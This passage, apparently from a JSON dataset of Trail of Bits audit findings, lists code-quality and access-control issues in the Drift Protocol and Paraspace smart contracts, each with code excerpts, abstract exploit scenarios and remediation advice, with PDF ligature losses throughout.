occurred around May 11, 2022 suggests that the exchanges pausing mechanisms contributed to the incidents subsequent fallout: The protocol did not have a kill-switch where only withdrawals were halted. The protocol was paused in the second pause to prevent a further drain of user funds This suggests that the pausing mechanisms should receive heightened attention to reduce the damage should another incident occur. Exploit Scenario Mallory tricks an administrator into pausing funding after withdrawals have already been paused. By pausing funding, the administrator unwittingly unpauses withdrawals. Recommendations Short term:    Represent the exchanges status as a set of ags. This will allow individual operations to be paused independently of one another. Ensure exchange statuses map cleanly to the operations that can be paused. Add documentation where there is potential for confusion. This will help ensure developers check the proper exchange statuses. Adopt a single approach for checking the exchanges status and apply it consistently throughout the codebase. If an exception must be made for a check, explain why in a comment near that check. Adopting such a policy will reduce the likelihood that a missing check goes unnoticed. Long term, periodically review the exchange status checks. Since the exchange status checks represent a form of access control, they deserve heightened scrutiny. Moreover, the exchanges pausing mechanisms played a role in past incidents.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Spot market access controls are incomplete ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "Functions in admin.rs involving perpetual markets verify that the market is valid, i.e., not delisted (gure 13.1). However, functions involving spot markets do not include such checks (e.g., gure 13.2). Drift Protocol has indicated that the spot market implementation is incomplete. #[access_control( market_valid(&ctx.accounts.perp_market) )] pub fn handle_update_perp_market_expiry ( ctx: Context <AdminUpdatePerpMarket>, expiry_ts: i64 , ) -> Result <()> { Figure 13.1: programs/drift/src/instructions/admin.rs#L676L682 _ pub fn handle_update_spot_market_expiry ( ctx: Context <AdminUpdateSpotMarket>, expiry_ts: i64 , ) -> Result <()> { Figure 13.2: programs/drift/src/instructions/admin.rs#L656L660 A similar example concerning whether the exchange is paused appears in gure 13.3 and 13.4. #[access_control( exchange_not_paused(&ctx.accounts.state) )] pub fn handle_place_perp_order (ctx: Context <PlaceOrder>, params: OrderParams ) -> Result <()> { Figure 13.3: programs/drift/src/instructions/user.rs#L687L690 _ pub fn handle_place_spot_order (ctx: Context <PlaceOrder>, params: OrderParams ) -> Result <()> { Figure 13.4: programs/drift/src/instructions/user.rs#L1022L1023 Exploit Scenario Mallory tricks an administrator into making a call that re-enables an expiring spot market. Mallory prots by trading against the should-be-expired spot market. Recommendations Short term, add the missing access controls to the spot market functions in admin.rs . This will ensure that an administrator cannot accidentally perform an operation on an expired spot market. Long term, add tests to verify that each function involving spot markets fails when invoked on an expired spot market. This will increase condence that the access controls have been implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. Oracles can be invalid in at most one way ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The Drift Protocol codebase represents oracle validity using an enum , which does not allow an oracle to be invalid in more than one way. Furthermore, the code that determines an oracles validity imposes an implicit hierarchy on the ways an oracle could be invalid. This design is fragile and likely to cause future problems. The OracleValidity enum is shown in gure 14.1, and the code that determines an oracles validity is shown in gure 14.2. Note that if an oracle is, for example, both too volatile and too uncertain, the oracle will be labeled simply TooVolatile . A caller that does not account for this fact and simply checks whether an oracle is TooUncertain could overlook oracles that are both too volatile and too uncertain. pub enum OracleValidity { Invalid, TooVolatile, TooUncertain, StaleForMargin, InsufficientDataPoints, StaleForAMM, Valid, } Figure 14.1: programs/drift/src/math/oracle.rs#L21L29 pub fn oracle_validity ( last_oracle_twap: i64 , oracle_price_data: & OraclePriceData , valid_oracle_guard_rails: & ValidityGuardRails , ) -> DriftResult <OracleValidity> { ... let oracle_validity = if is_oracle_price_nonpositive { OracleValidity::Invalid } else if is_oracle_price_too_volatile { OracleValidity::TooVolatile } else if is_conf_too_large { OracleValidity::TooUncertain } else if is_stale_for_margin { OracleValidity::StaleForMargin } else if !has_sufficient_number_of_data_points { OracleValidity::InsufficientDataPoints } else if is_stale_for_amm { OracleValidity::StaleForAMM } else { OracleValidity::Valid }; Ok (oracle_validity) } Figure 14.2: programs/drift/src/math/oracle.rs#L163L230 Exploit Scenario Alice, a Drift Protocol developer, is unaware of the implicit hierarchy among the OracleValidity variants. Alice writes code like oracle_validity != OracleValidity::TooUncertain and unknowingly introduces a bug into the codebase. Recommendations Short term, represent oracle validity as a set of ags. This will allow oracles to be invalid in more than one way, which will result in more robust and maintainable code. Long term, thoroughly test all code that relies on oracle validity. This will help ensure the codes correctness following the aforementioned change.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Code duplication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "Various les in the programs/drift directory contain duplicate code, which can lead to incomplete xes or inconsistent behavior (e.g., because the code is modied in one location but not all). As an example, the code in gure 15.1 appears nearly verbatim in the functions liquidate_perp , liquidate_spot , liquidate_borrow_for_perp_pnl , and liquidate_perp_pnl_for_deposit . // check if user exited liquidation territory let (intermediate_total_collateral, intermediate_margin_requirement_with_buffer) = if !canceled_order_ids.is_empty() || lp_shares > 0 { ... // 37 lines ( intermediate_total_collateral, intermediate_margin_requirement_plus_buffer, ) } else { (total_collateral, margin_requirement_plus_buffer) }; Figure 15.1: programs/drift/src/controller/liquidation.rs#L201L246 In some places, the text itself is not obviously duplicated, but the logic it implements is clearly duplicated. An example appears in gures 15.2 and 15.3. Such logical code duplication suggests the code does not use the right abstractions. // Update Market open interest if let PositionUpdateType::Open = update_type { if position.quote_asset_amount == 0 && position.base_asset_amount == 0 { market.number_of_users = market.number_of_users.safe_add( 1 )?; } market.number_of_users_with_base = market.number_of_users_with_base.safe_add( 1 )?; } else if let PositionUpdateType::Close = update_type { if new_base_asset_amount == 0 && new_quote_asset_amount == 0 { market.number_of_users = market.number_of_users.safe_sub( 1 )?; } market.number_of_users_with_base = market.number_of_users_with_base.safe_sub( 1 )?; } Figure 15.2: programs/drift/src/controller/position.rs#L162L175 if position.quote_asset_amount == 0 && position.base_asset_amount == 0 { market.number_of_users = market.number_of_users.safe_add( 1 )?; } position.quote_asset_amount = position.quote_asset_amount.safe_add(delta)?; market.amm.quote_asset_amount = market.amm.quote_asset_amount.safe_add(delta.cast()?)?; if position.quote_asset_amount == 0 && position.base_asset_amount == 0 { market.number_of_users = market.number_of_users.safe_sub( 1 )?; } Figure 15.3: programs/drift/src/controller/position.rs#L537L547 Exploit Scenario Alice, a Drift Protocol developer, is asked to x a bug in liquidate_perp . Alice does not realize that the bug also applies to liquidate_spot , liquidate_borrow_for_perp_pnl , and liquidate_perp_pnl_for_deposit , and xes the bug in only liquidate_perp . Eve discovers that the bug is not xed in one of the other three functions and exploits it. Recommendations Short term:   Refactor liquidate_perp , liquidate_spot , liquidate_borrow_for_perp_pnl , and liquidate_perp_pnl_for_deposit to eliminate the code duplication. This will reduce the likelihood of an incomplete x for a bug aecting more than one of these functions. Identify cases where the code uses the same logic, and implement abstractions to capture that logic. Ensure that code that relies on such logic uses the new abstractions. Consolidating similar pieces of code will make the overall codebase easier to reason about. Long term, adopt code practices that discourage code duplication. This will help to prevent this problem from recurring.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Inconsistent use of integer types ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The Drift Protocol codebase uses integer types inconsistently; data of similar kinds is represented using dierently sized types or types with dierent signedness. Conversions from one integer type to another present an opportunity for the contracts to fail and should be avoided. For example, the pow method expects a u32 argument. However, in some places u128 values must be cast to u32 values, even though those values are intended to be used as exponents (gures 16.1, 16.2, and 16.3). let expo_diff = (spot_market.insurance_fund.shares_base - insurance_fund_stake.if_base) . cast::< u32 >() ?; let rebase_divisor = 10_ u128 .pow(expo_diff); Figure 16.1: programs/drift/src/controller/insurance.rs#L154L157 #[zero_copy] #[derive(Default, Eq, PartialEq, Debug)] #[repr(C)] pub struct InsuranceFund { pub vault: Pubkey , pub total_shares: u128 , pub user_shares: u128 , pub shares_base: u128 , pub unstaking_period: i64 , // if_unstaking_period pub last_revenue_settle_ts: i64 , pub revenue_settle_period: i64 , pub total_factor: u32 , // percentage of interest for total insurance pub user_factor: u32 , // percentage of interest for user staked insurance // exponent for lp shares (for rebasing) } Figure 16.2: programs/drift/src/state/spot_market.rs#L352L365 #[account(zero_copy)] #[derive(Default, Eq, PartialEq, Debug)] #[repr(C)] pub struct InsuranceFundStake { pub authority: Pubkey , if_shares: u128 , pub last_withdraw_request_shares: u128 , // get zero as 0 when not in escrow pub if_base: u128 , // exponent for if_shares decimal places (for rebase) pub last_valid_ts: i64 , pub last_withdraw_request_value: u64 , pub last_withdraw_request_ts: i64 , pub cost_basis: i64 , pub market_index: u16 , pub padding: [ u8 ; 14 ], } Figure 16.3: programs/drift/src/state/insurance_fund_stake.rs#L10L24 The following command reveals 689 locations where the cast method appears to be used: grep -r -I '\\.cast\\>' programs/drift Each such use could lead to a denial of service if an attacker puts the contract into a state where the cast always errors. Many of these uses could be eliminated by more consistent use of integer types. Note that Drift Protocol has indicated that some of the observed inconsistencies are related to reducing rent costs. Exploit Scenario Mallory manages to put the contract into a state such that one of the nearly 700 uses of cast always returns an error. The contract becomes unusable for Alice, who needs to execute a code path involving the vulnerable cast . Recommendations Short term, review all uses of cast to see which might be eliminated by changing the types of the operands. This will reduce the overall number of cast s and reduce the likelihood that one could lead to denial of service. Long term, as new code is introduced into the codebase, review the types used to hold similar kinds of data. This will reduce the likelihood that new cast s are needed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Use of opaque constants in tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "Several of the Drift Protocol tests use constants with no explanation for how they were derived, which makes it dicult to assess whether the tests are functioning correctly. Ten examples appear in gure 17.1. In each case, a variable or eld is compared against a constant consisting of 612 random-looking digits. Without an explanation for how these digits were obtained, it is dicult to tell whether the constant expresses the correct value. assert_eq! (user.spot_positions[ 0 ].scaled_balance, 45558159000 ); assert_eq! (user.spot_positions[ 1 ].scaled_balance, 406768999 ); ... assert_eq! (margin_requirement, 44744590 ); assert_eq! (total_collateral, 45558159 ); assert_eq! (margin_requirement_plus_buffer, 45558128 ); ... assert_eq! (token_amount, 406769 ); assert_eq! (token_value, 40676900 ); assert_eq! (strict_token_value_1, 4067690 ); // if oracle price is more favorable than twap ... assert_eq! (liquidator.spot_positions[ 0 ].scaled_balance, 159441841000 ); ... assert_eq! (liquidator.spot_positions[ 1 ].scaled_balance, 593824001 ); Figure 17.1: programs/drift/src/controller/liquidation/tests.rs#L1618L1687 Exploit Scenario Mallory discovers that a constant used in a Drift Protocol test was incorrectly derived and that the tests were actually verifying incorrect behavior. Mallory uses the bug to siphon funds from the Drift Protocol exchange. Recommendations Short term, where possible, compute values using an explicit formula rather than an opaque constant. If using an explicit formula is not possible, include a comment explaining how the constant was derived. This will help to ensure that correct behavior is being tested for. Moreover, the process of giving such explicit formulas could reveal errors. Long term, write scripts to identify constants with high entropy, and run those scripts as part of your CI process. This will help to ensure the aforementioned standards are maintained.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Accounts from contexts are not always used by the instruction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The context denition for the initialize instruction denes a drift_signer account. However, this account is not used by the instruction. It appears to be a remnant used to pass the address of the state PDA account; however, the need to do this was eliminated by the use of find_program_address to calculate the address. Also, in the initialize_insurance_fund_stake instruction, the spot_market , user_stats , and state accounts from the context are not used by the instruction. #[derive(Accounts)] pub struct Initialize <'info> { #[account(mut)] pub admin: Signer <'info>, #[account( init, seeds = [b \"drift_state\" .as_ref()], space = std::mem::size_of::<State>() + 8, bump, payer = admin )] pub state: Box <Account<'info, State>>, pub quote_asset_mint: Box <Account<'info, Mint>>, /// CHECK: checked in `initialize` pub drift_signer: AccountInfo <'info>, pub rent: Sysvar <'info, Rent>, pub system_program: Program <'info, System>, pub token_program: Program <'info, Token>, } Figure 18.1: programs/drift/src/instructions/admin.rs#L1989L2007 Exploit Scenario Alice, a Drift Protocol developer, assumes that the drift_signer account is used by the instruction, and she uses a dierent address for the account, expecting this account to hold the contract state after the initialize instruction has been called. Recommendations Short term, remove the unused account from the context. This eliminates the possibility of confusion around the use of the accounts. Long term, employ a process where a refactoring of an instructions code is followed by a review of the corresponding context denition. This ensures that the context is in sync with the instruction handlers.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Unaligned references are allowed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "The Drift Protocol codebase uses the #![allow(unaligned_references)] attribute. This allows the use of unaligned references throughout the program and could mask serious problems in future updates to the contract. #![allow(clippy::too_many_arguments)] #![allow(unaligned_references)] #![allow(clippy::bool_assert_comparison)] #![allow(clippy::comparison_chain)] Figure 19.1: programs/drift/src/lib.rs#L1L4 Exploit Scenario Alice, a Drift Protocol developer, accidentally introduces errors caused by the use of unaligned references, aecting the contract operation and leading to a loss of funds. Recommendations Short term, remove the attributes. This ensures that the check for unaligned references correctly ag such cases. Long term, be conservative with the use of attributes used to suppress warnings or errors throughout the codebase. If possible, apply them to only the minimum possible amount of code. This minimizes the risk of problems stemming from the suppressed checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Size of created accounts derived from in-memory representation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-driftlabs-driftprotocol-securityreview.pdf",
        "body": "When state accounts are initialized, the size of the account is set to std::mem::size_of::<ACCOUNT_TYPE>() + 8 , where the eight extra bytes are used for the discriminator. The structs for the state types all have a trailing eld with padding, seemingly to ensure the account size is aligned to eight bytes and to determine the size of the account. In other places, the code relies on the size_of function to determine the type of accounts passed to the instruction. While we could not nd any security-related problem with the scheme today, this does mean that every accounts in-memory representation is inated by the amount of padding, which could become a problem with respect to the limitation of the stack or heap size. Furthermore, if any of the accounts are updated in such a way that the repr(C) layout size diers from the Anchor space reference , it could cause a problem. For example, if the SpotMarket struct is changed so that its in-memory representation is smaller than the required Anchor size, the initialize_spot_market would fail because the created account would be too small to hold the serialized representation of the data. #[account] #[derive(Default)] #[repr(C)] pub struct State { pub admin: Pubkey , pub whitelist_mint: Pubkey , pub discount_mint: Pubkey , pub signer: Pubkey , pub srm_vault: Pubkey , pub perp_fee_structure: FeeStructure , pub spot_fee_structure: FeeStructure , pub oracle_guard_rails: OracleGuardRails , pub number_of_authorities: u64 , pub number_of_sub_accounts: u64 , pub lp_cooldown_time: u64 , pub liquidation_margin_buffer_ratio: u32 , pub settlement_duration: u16 , pub number_of_markets: u16 , pub number_of_spot_markets: u16 , pub signer_nonce: u8 , pub min_perp_auction_duration: u8 , pub default_market_order_time_in_force: u8 , pub default_spot_auction_duration: u8 , pub exchange_status: ExchangeStatus , pub padding : [ u8 ; 17 ], } Figure 20.1: The State struct, with corresponding padding #[account( init, seeds = [b \"drift_state\" .as_ref()], space = std::mem::size_of::<State>() + 8 , bump, payer = admin )] pub state: Box <Account<'info, State>>, Figure 20.2: The creation of the State account, using the in-memory size if data.len() < std::mem::size_of::<UserStats>() + 8 { return Ok (( None , None )); } Figure 20.3: An example of the in-memory size used to determine the account type Exploit Scenario Alice, a Drift Protocol developer, unaware of the implicit requirements of the in-memory size, makes changes to a state accounts structure or adds a state structure account such that the in-memory size is smaller than the size needed for the serialized data. As a result, instructions in the contract that save data to the account will fail. Recommendations Short term, add an implementation to each state struct that returns the size to be used for the corresponding Solana account. This avoids the overhead of the padding and removes the dependency on assumption about the in-memory size. Long term, avoid using assumptions about in-memory representation of type within programs created in Rust. This ensures that changes to the representation do not aect the program's operation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Unconventional test structure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "Aspects of the Paraspace tests make them dicult to run. Tests that are dicult to run are less likely to be run. First, the Paraspace tests are congured to initialize all tests before any single test can be run. Therefore, even simple tests incur the initialization costs of the most expensive tests. Such a design hinders development. Figure 1.1 shows the rst 25 lines that are output during test initialization. Approximately 270 lines are output before the rst test is run. As shown in the gure, several ERC20 and ERC721 tokens are deployed during initialization. These steps are unnecessary in many testing situations, such as if a user wants to run a test that does not involve these tokens. - Environment - Network : hardhat -> Deploying test environment... ------------ step 00 done ------------ deploying now DAI deploying now WETH deploying now USDC deploying now USDT deploying now WBTC deploying now stETH deploying now APE deploying now aWETH deploying now cETH deploying now PUNK ------------ step 0A done ------------ deploying now WPUNKS deploying now BAYC deploying now MAYC deploying now DOODLE deploying now AZUKI deploying now CLONEX deploying now MOONBIRD deploying now MEEBITS deploying now OTHR deploying now UniswapV3 ... Figure 1.1: The rst 25 lines emitted by Paraspace tests Second, the paraspace-core repository uses the paraspace-deploy repository as a Git submodule and relies on it when being built and tested. However, while the former is public, the latter is private. Therefore, paraspace-core can be built or tested only by those with access to paraspace-deploy. Finally, some tests use nested it calls (gure 1.2), which are not supported by Mocha. it(\"deposited aWETH should have balance multiplied by rebasing index\", async () => { ... it(\"should be able to supply aWETH and mint rebasing PToken\", async () => { ... }); it(\"expect the scaled balance to be the principal balance multiplied by Aave pool liquidity index divided by RAY (2^27)\", async () => { ... }); }); Figure 1.2: test-suites/rebasing.spec.ts#L125L165 Developers should strive to implement testing that thoroughly covers the project and tests against both bad and expected inputs. Having robust unit and integration tests can greatly increase both developers and users condence in the codes functionality. However, tests cannot benet the system if they are not actually run. Therefore, tests should be made as easy to run as possible. Exploit Scenario Alice, a Paraspace developer, develops fewer tests than she otherwise would because she is frustrated by the time required to run the tests. Paraspaces test coverage suers as a result. Recommendations Short term, take the following steps:  Adopt a more tailored testing solution that deploys only the resources needed to run any given test.  Either make the paraspace-deploy repository public or eliminate paraspace-cores reliance on paraspace-deploy.  Rewrite the tests in rebasing.spec.ts to eliminate the nested it calls. Making tests easier to run will help ensure that they are actually run. Long term, consider timing individual tests in the continuous integration process. Doing so will help to identify tests with extreme resource requirements. References  Pull request #4525 in mochajs/mocha: Throw on nested it call  Stack Overow: Mocha test case - are nested it( ) functions kosher? 2. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-PARASPACE-2 Target: Various targets",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing supportsInterface functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "According to EIP-165, a contracts implementation of the supportsInterface function should return true for the interfaces that the contract supports. Outside of the dependencies and mocks directories, only one Paraspace contract has a supportsInterface function. For example, each of the following contracts includes an onERC721Received function; therefore, they should have a supportsInterface function that returns true for the ERC721TokenReceiver interface ( PoolCores onERC721Received implementation appears in gure 3.1):  contracts/ui/MoonBirdsGateway.sol  contracts/ui/UniswapV3Gateway.sol  contracts/ui/WPunkGateway.sol  contracts/protocol/tokenization/NToken.sol  contracts/protocol/tokenization/NTokenUniswapV3.sol  contracts/protocol/tokenization/NTokenMoonBirds.sol  contracts/protocol/pool/PoolCore.sol // This function is necessary when receive erc721 from looksrare function onERC721Received( address, address, uint256, bytes memory ) external virtual returns (bytes4) { return this.onERC721Received.selector; } Figure 3.1: contracts/protocol/pool/PoolCore.sol#L773L781 Exploit Scenario Alices contract tries to send an ERC721 token to a PoolCore contract. Alices contract rst tries to determine whether the PoolCore contract supports the ERC721TokenReceiver interface by calling supportsInterface. When the call reverts, Alices contract aborts the transfer. Recommendations Short term, add supportsInterface functions to all contracts that implement a well-known interface. Doing so will help to ensure that Paraspace contracts can interact with external contracts. Long term, add tests to ensure that each contracts supportsInterface function returns true for the interfaces that the contract supports and false for some subset of the interfaces that the contract does not support. Doing so will help to ensure that the supportsInterface functions work correctly. References  EIP-165: Standard Interface Detection  EIP-721: Non-Fungible Token Standard",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. ERC1155 asset type is dened but not implemented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "The asset type ERC1155 is dened in DataTypes.sol but is not otherwise supported. Having an unsupported variant in the code is risky, as developers could use it accidentally. The AssetType declaration appears in gure 4.1. It consists of three variants, one of which is ERC1155. However, ERC1155 does not appear anywhere else in the code. For example, it does not appear in the executeRescueTokens function in the PoolLogic.sol contract (gure 4.2), meaning it is not possible to rescue ERC1155 tokens. enum AssetType { ERC20, ERC721, ERC1155 } Figure 4.1: contracts/protocol/libraries/types/DataTypes.sol#L7L11 function executeRescueTokens( DataTypes.AssetType assetType, address token, address to, uint256 amountOrTokenId ) external { if (assetType == DataTypes.AssetType.ERC20) { IERC20(token).safeTransfer(to, amountOrTokenId); } else if (assetType == DataTypes.AssetType.ERC721) { IERC721(token).safeTransferFrom(address(this), to, amountOrTokenId); } } Figure 4.2: contracts/protocol/libraries/logic/PoolLogic.sol#L80L91 Exploit Scenario Alice, a Paraspace developer, writes code that uses the ERC1155 asset type. Because the asset type is not implemented, Alices code does not work correctly. Recommendations Short term, remove ERC1155 from AssetType. Doing so will eliminate the possibility that a developer will use it accidentally. Long term, if the ERC1155 asset type is re-enabled, thoroughly test all code using it. Regularly review all conditionals involving asset types (e.g., as in gure 4.2) to verify that they handle all applicable asset types correctly. Taking these steps will help to ensure that the code works properly following the incorporation of ERC1155 assets.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. executeMintToTreasury silently skips non-ERC20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "The executeMintToTreasury function silently ignores non-ERC20 assets passed to it. Such behavior could allow erroneous calls to executeMintToTreasury to go unnoticed. The code for executeMintToTreasury appears in gure 5.1. It is called from the mintToTreasury function in PoolParameters.sol (gure 5.2). As shown in gure 5.1, non-ERC20 assets are silently skipped. function executeMintToTreasury( mapping(address => DataTypes.ReserveData) storage reservesData, address[] calldata assets ) external { for (uint256 i = 0; i < assets.length; i++) { address assetAddress = assets[i]; DataTypes.ReserveData storage reserve = reservesData[assetAddress]; DataTypes.ReserveConfigurationMap memory reserveConfiguration = reserve.configuration; // this cover both inactive reserves and invalid reserves since the flag will be 0 for both !reserveConfiguration.getActive() || reserveConfiguration.getAssetType() != DataTypes.AssetType.ERC20 continue; if ( ) { } ... } } Figure 5.1: contracts/protocol/libraries/logic/PoolLogic.sol#L98L134 function mintToTreasury(address[] calldata assets) external virtual override nonReentrant { } PoolLogic.executeMintToTreasury(_reserves, assets); Figure 5.2: contracts/protocol/pool/PoolParameters.sol#L97L104 Note that because this is a minting operation, it likely meant to be called by an administrator. However, an administrator could pass a non-ERC20 asset in error. Because the function silently skips such assets, the error could go unnoticed. Exploit Scenario Alice, a Paraspace administrator, calls mintToTreasury with an array of assets. Alice accidentally sets one array element to an ERC721 asset. Alices mistake is silently ignored by the on-chain code, and no error is reported. Recommendations Short term, have executeMintToTreasury revert when a non-ERC20 asset is passed to it. Doing so will ensure that callers are alerted to such errors. Long term, regularly review all conditionals involving asset types to verify that they handle all applicable asset types correctly. Doing so will help to identify problems involving the handling of dierent asset types.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. getReservesData does not set all AggregatedReserveData elds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "The getReservesData function lls in an AggregatedReserveData structure for the reserve handled by an IPoolAddressesProvider. However, the function does not set the structures name and assetType elds. Therefore, o-chain code relying on this function will see uninitialized data. Part of the AggregatedReserveData structure appears in gure 6.1. The complete structure consists of 53 elds. Each iteration of the loop in getReservesData (gure 6.2) lls in the elds of one AggregatedReserveData structure. However, the loop does not set the structures name elds. And although reserve assetTypes are computed, they are never stored in the structure. struct AggregatedReserveData { address underlyingAsset; string name; string symbol; ... //AssetType DataTypes.AssetType assetType; } Figure 6.1: contracts/ui/interfaces/IUiPoolDataProvider.sol#L18L78 function getReservesData(IPoolAddressesProvider provider) public view override returns (AggregatedReserveData[] memory, BaseCurrencyInfo memory) { IParaSpaceOracle oracle = IParaSpaceOracle(provider.getPriceOracle()); IPool pool = IPool(provider.getPool()); address[] memory reserves = pool.getReservesList(); AggregatedReserveData[] memory reservesData = new AggregatedReserveData[](reserves.length); for (uint256 i = 0; i < reserves.length; i++) { ... DataTypes.AssetType assetType; ( reserveData.isActive, reserveData.isFrozen, reserveData.borrowingEnabled, reserveData.stableBorrowRateEnabled, isPaused, assetType ) = reserveConfigurationMap.getFlags(); ... } ... return (reservesData, baseCurrencyInfo); } Figure 6.2: contracts/ui/UiPoolDataProvider.sol#L83L269 Exploit Scenario Alice writes o-chain code that calls getReservesData. Alices code treats the returned name and assetType elds as if they have been properly lled in. Because these elds have not been set, Alices code behaves incorrectly (e.g., by trying to transfer ERC721 tokens as though they were ERC20 tokens). Recommendations Short term, adjust getReservesData so that it sets the name and assetType elds. Doing so will help prevent o-chain code from receiving uninitialized data. Long term, test code that is meant to be called from o-chain to verify that every returned eld is set. Doing so can help to catch bugs like this one.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Excessive type repetition in returned tuples ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "Several functions return tuples that contain many elds of the same type adjacent to one another. Such a practice is error-prone, as callers could easily confuse the elds. An example appears in gure 7.1. The tuple returned by the calculateUserAccountData function contains nine elds of type uint256 adjacent to each other. An example in which the function is called appears in gure 7.2. As the gure makes evident, a misplaced comma, indicating that the caller identied the wrong eld holding the data of interest, could have disastrous consequences. /** * @notice Calculates the user data across the reserves. * @dev It includes the total liquidity/collateral/borrow balances in the base currency used by the price feed, * the average Loan To Value, the average Liquidation Ratio, and the Health factor. * @param reservesData The state of all the reserves * @param reservesList The addresses of all the active reserves * @param params Additional parameters needed for the calculation * @return The total collateral of the user in the base currency used by the price feed * @return The total ERC721 collateral of the user in the base currency used by the price feed * @return The total debt of the user in the base currency used by the price feed * @return The average ltv of the user * @return The average liquidation threshold of the user * @return The health factor of the user * @return True if the ltv is zero, false otherwise **/ function calculateUserAccountData( mapping(address => DataTypes.ReserveData) storage reservesData, mapping(uint256 => address) storage reservesList, DataTypes.CalculateUserAccountDataParams memory params ) internal view returns ( uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, bool ) { ... return ( vars.totalCollateralInBaseCurrency, vars.totalERC721CollateralInBaseCurrency, vars.totalDebtInBaseCurrency, vars.avgLtv, vars.avgLiquidationThreshold, vars.avgERC721LiquidationThreshold, vars.payableDebtByERC20Assets, vars.healthFactor, vars.erc721HealthFactor, vars.hasZeroLtvCollateral ); Figure 7.1: contracts/protocol/libraries/logic/GenericLogic.sol#L58L302 } ( vars.userGlobalCollateralBalance, , vars.userGlobalTotalDebt, , , , , , vars.healthFactor, ) = GenericLogic.calculateUserAccountData( Figure 7.2: contracts/protocol/libraries/logic/LiquidationLogic.sol#L393L404 Also, note that the documentation of calculateUserAccountData does not accurately reect the implementation. The documentation describes only six returned uint256 elds (highlighted in yellow in gure 7.1). In reality, the function returns an additional three (highlighted in red in gure 7.1). Less extreme but similar examples of adjacent eld types in tuples appear in gures 7.3 and 7.4. function getFlags(DataTypes.ReserveConfigurationMap memory self) internal pure returns ( bool, bool, bool, bool, bool, DataTypes.AssetType ) Figure 7.3: contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L516 L526 function getParams(DataTypes.ReserveConfigurationMap memory self) internal pure returns ( uint256, uint256, uint256, uint256, uint256, bool ) Figure 7.4: contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L552 L562 Exploit Scenario Alice, a Paraspace developer, writes code that calls calculateUserAccountData. Alice misplaces a comma, causing the health factor to be interpreted as the ERC721 health factor. Alices code behaves incorrectly as a result. Recommendations Short term, take the following steps:  Choose a threshold for adjacent elds of the same type in tuples (e.g., four). Wherever functions return tuples containing a number of adjacent elds of the same type greater than that threshold, have the functions return structs instead. Returning a struct instead of a tuple will reduce the likelihood that a caller will confuse the returned values.  Correct the documentation in gure 7.1. Doing so will reduce the likelihood that calculateUserAccountData is miscalled. Long term, as new functions are added to the codebase, ensure that they respect the threshold chosen in implementing the short-term recommendation. Doing so will help to ensure that values returned from the new functions are not misinterpreted.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Incorrect grace period could result in denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
